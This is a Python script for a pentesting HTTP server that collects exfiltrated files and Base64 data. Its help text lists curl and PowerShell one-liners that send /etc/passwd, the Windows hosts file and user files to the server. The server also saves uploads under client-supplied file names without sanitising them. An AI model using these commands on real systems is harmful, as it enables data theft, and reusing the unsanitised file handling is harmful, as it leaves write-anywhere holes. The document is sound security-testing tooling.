#!/usr/bin/python3

# name:         pentest_http_server.py
#
# version:      1.0
#
# author:       r0pchainzZz
# 
# license:      GPL 3.0
# 
# description:  Builds on Python's httpserver class to add some features
#               useful for pentesting. The main additions are:
#                   1.  an upload page for data exfil at /upload_page
#                   2.  an upload endpoint at /u for non-browser exfil
#                   3.  an enpoint at /64 that will automatically decode 
#                       POSTed Base64 data and save it to a file.
#                   4.  Default logging to file for large POST requests to
#                       any other endpoint.
#
#               Use the -h or --show-help flags for more details and examples

import click, re, base64, datetime, os, urllib.parse
from functools import partial
from http.server import SimpleHTTPRequestHandler, HTTPServer

class Handler(SimpleHTTPRequestHandler):

    def __init__(self, max_post, *args, **kwargs):
        self.max_post = max_post
        super().__init__(*args, **kwargs)

    def _acknowledge_post(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()

    def parse_params(self):
        qs = urllib.parse.urlparse(self.path).query
        params = urllib.parse.parse_qs(qs)
        if params:
            return [True,params]
        else:
            return [False,params]

    def show_upload_page(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()

        data = """
<html>
<body>
   <form enctype = "multipart/form-data" action = "u" method = "post">   
<p>Upload File: <input type = "file" name = "file" /></p>
<p><input type = "submit" value = "Upload" /></p>
</form>
</body>
</html>"""
        self.wfile.write(bytes(data,"utf-8"))

    def process_b64(self):
        try:
            plain = base64.b64decode(self.post_data)
        except:
            self.log_message("Invalid Base64 received in POST.")
            return
        
        dir = "files_from_base64"
        if not os.path.exists(dir):
            os.mkdir(dir)
        
        if "name" in self.params:
            name = os.path.join(dir,self.params["name"][0])
        else:
            now = datetime.datetime.now()
            date_time_str = now.strftime("%Y-%m-%d_%H-%M-%S")
            name = os.path.join(dir,f"{date_time_str}-upload")
        
        base_name = name
        count = 1
        while os.path.exists(name):
            name = f"{base_name}_{count}"
            count += 1

        try:
            with open(name, "wb") as f:
                f.write(plain)
                f.write("\n".encode("utf-8"))
            self.log_message(f"Base64 POST request decoded and saved to: {name}")
        except:
            self.log_message("Received Base64 message that could not be saved to file.")
        

    # modified from https://github.com/bones7456/bones7456/blob/master/SimpleHTTPServerWithUpload.py
    def handle_post_data(self):
        boundary = self.headers['content-type'].split("=")[1].encode("utf-8")
        remainbytes = int(self.headers['content-length'])
        line = self.rfile.readline()
        remainbytes -= len(line)
        if not boundary in line:
            return (False, "Content does NOT begin with boundary")
        line = self.rfile.readline()
        remainbytes -= len(line)
        name = re.findall(r'Content-Disposition.*name="file"; filename="(.*)"', line.decode("utf-8"))
        if not name:
            return (False, "Cannot find file name...")
        name = name[0]

        dir = "uploaded_files"
        if not os.path.exists(dir):
            os.mkdir(dir)

        base_name = os.path.join(dir, name)
        name = base_name
        count = 1
        while os.path.exists(name):
            name = f"{base_name}_{count}"
            count += 1

        line = self.rfile.readline()
        remainbytes -= len(line)
        line = self.rfile.readline()
        remainbytes -= len(line)
        try:
            out = open(name, 'wb')
        except IOError:
            return (False, "Cannot create file to write. Do you have write permissions?")
                
        preline = self.rfile.readline()
        remainbytes -= len(preline)
        while remainbytes > 0:
            line = self.rfile.readline()
            remainbytes -= len(line)
            if boundary in line:
                preline = preline[0:-1]
                if preline.endswith('\r'.encode("utf-8")):
                    preline = preline[0:-1]
                out.write(preline)
                out.close()
                return (True, "File '%s' upload success!" % name)
            else:
                out.write(preline)
                preline = line
        return (False, "Unexpected end of data.")

    def save_large_post(self):

        dir = "saved_large_POSTs"
        if not os.path.exists(dir):
            os.mkdir(dir)

        now = datetime.datetime.now()
        date_time_str = now.strftime("%Y-%m-%d_%H-%M-%S")
        name = os.path.join(dir, f"{date_time_str}-post.txt")
        header_name = os.path.join(dir, f"{date_time_str}-headers.txt")

        self.post_data = self.rfile.read(self.content_length)
        try:
            with open(name, "wb") as f:
                f.write(self.post_data)
                f.write("\n".encode("utf-8"))

            with open(header_name, "wb") as f:
                f.write(f"{self.path}\n".encode("utf-8"))
                for i in self.headers:
                    f.write(f"{i}: {self.headers[i]}\n".encode("utf-8"))

            self.log_message(f"Large POST request received and saved to: {name}")
        except:
            self.log_message("Received large POST request that could not be saved to file. If you are trying to transfer a binary file, convert it to base64 and POST it to '/64' or use the file upload feature at '/u'.")
            

    def do_GET(self):
        if re.search(r"^/upload-page", self.path):
            self.show_upload_page()
        else:
            super().do_GET()


    def do_POST(self):
        params = self.parse_params()
        if params[0] == True:
            self.params = params[1]

        if re.search(r"^/64", self.path):
            self.content_length = int(self.headers['Content-Length'])
            self.post_data = self.rfile.read(self.content_length).decode('utf-8')
            self.process_b64()
        elif re.search(r"^/u", self.path):
            out = self.handle_post_data()
            if out[0] == False:
                self.log_message(f"Error saving file: {out[1]}")
        else:
            self.content_length = int(self.headers['Content-Length'])
        
            if self.content_length > self.max_post:
                self.save_large_post() 
            else:
                self.post_data = self.rfile.read(self.content_length).decode('utf-8')
                self.log_message(f"POST data received: {self.post_data}")

        self._acknowledge_post()


def show_help():
    print(r"""Author: r0pchainzZz

- The server has the same GET file serving capabilities as the standard SimpleHTTPServer.
- There is a manual upload page available at GET /upload-page.
- Data can also be exfiltrated by sending base64 in the body of a POST request to any endpoint starting with '/64'. Any base64 sent to the endpoint will be automatically decoded and saved to a file. Adding a 'name' parameter in the url of the POST request will make that the name of the saved file after it is decoded.
- Files can also be exfiltrated by POSTing them to /u as multipart form data. The name of the form data must be "file". See the examples below.
- POST requests to other endpoints will have their bodies displayed on screen. Request bodies of more than 256 characters will be saved to a file instead of displaying.

Examples of arbitrary file exfil while living off the land:

    linux:
        curl http://127.0.0.1:8888/u -F "file=@/etc/passwd"
        curl http://127.0.0.1:8888/64 -d "$(base64 -w0 /etc/passwd)"

    windows powershell:
        $uri = "http://example.com/u"
        $uploadPath = "C:\users\test\picture.jpg"
        $wc = New-Object System.Net.WebClient
        $resp = $wc.UploadFile($uri,$uploadPath)

        $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
        Invoke-WebRequest -Uri http://127.0.0.1:8000/64?name=data.txt -Method POST -Body $b64

Server logs:""")

def run(server_class=HTTPServer, handler_class=Handler, port=8888, help=False, max_post=256):
    if help:
        show_help()

    handler = partial(handler_class, max_post)
    server_address = ('', port)
    httpd = server_class(server_address, handler)
    print(f"Running Pentest HTTP Server on 0.0.0.0:{port}")
    httpd.serve_forever()


@click.command
@click.option('--port','-p',default=80,show_default=True,help="The port to run the server on.")
@click.option('--show-help','-h',default=False,show_default=True,is_flag=True,help="Display the server's usage instructions when it is run.")
@click.option('--max-post', '-m', default=256,show_default=True,help="The maximum size of POST request body the server will display on screen. Larger requests will be logged to file.")
def main(port,show_help,max_post):
    run(port=port,help=show_help,max_post=max_post)


if __name__ == "__main__":
    main()
